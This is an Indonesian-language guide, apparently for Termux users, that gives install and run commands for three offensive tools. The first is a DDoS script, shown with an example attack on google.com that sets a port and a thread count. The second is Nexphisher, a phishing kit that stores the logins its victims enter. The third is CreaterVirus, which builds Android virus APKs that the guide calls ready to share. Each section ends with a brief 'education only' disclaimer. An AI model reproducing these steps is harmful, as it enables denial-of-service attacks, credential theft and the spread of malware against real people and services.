💣 DDoS (kumpulanremaja/ddos2)
Langkah-langkah DDoS pkg update && pkg upgrade -y pkg install git -y pkg install python2 -y git clone https://github.com/kumpulanremaja/ddos2 cd ddos2 python2 ddos.py AlamatIp -p -t

Contoh menyerang google.com:
python2 ddos.py google.com 80 135

Keterangan:
- google.com = domain target (bisa diganti url lain)
- 80 = port (bisa 80, 443, dll)
- 135 = thread (jumlah serangan)

⚠️ Gunakan dengan bijak. Hanya untuk edukasi.

🎣 Nexphisher (htr-tech/nexphisher)
Langkah-langkah Nexphisher apt update apt install git -y git clone git://github.com/htr-tech/nexphisher.git cd nexphisher bash setup

Untuk Termux:
bash tmux_setup

Menjalankan Nexphisher:
bash nexphisher

Keterangan:
- Tools phishing dengan berbagai template (Facebook, Instagram, dll.)
- Hasil login korban akan tersimpan di folder sites

⚠️ Gunakan dengan bijak. Hanya untuk edukasi.

☣️ CreaterVirus (viruz09/CreaterVirus)
Langkah-langkah CreaterVirus apt update && apt upgrade apt install python2 apt install git git clone https://github.com/viruz09/CreaterVirus cd CreaterVirus python2 creater.py

Setelah tools berjalan:
- Pilih nomor virus yang ingin dibuat (1-8)
- Tunggu proses selesai
- Hasil virus akan berupa file APK

Copy virus ke penyimpanan:
cp agents.apk /sdcard

Keterangan:
- Tools ini dapat membuat berbagai macam virus Android
- Hasil berupa file APK yang bisa dibagikan
- Gunakan untuk keperluan edukasi dan pengujian keamanan

⚠️ PERINGATAN: Hanya untuk edukasi. Jangan gunakan untuk merusak atau mencuri data orang lain.
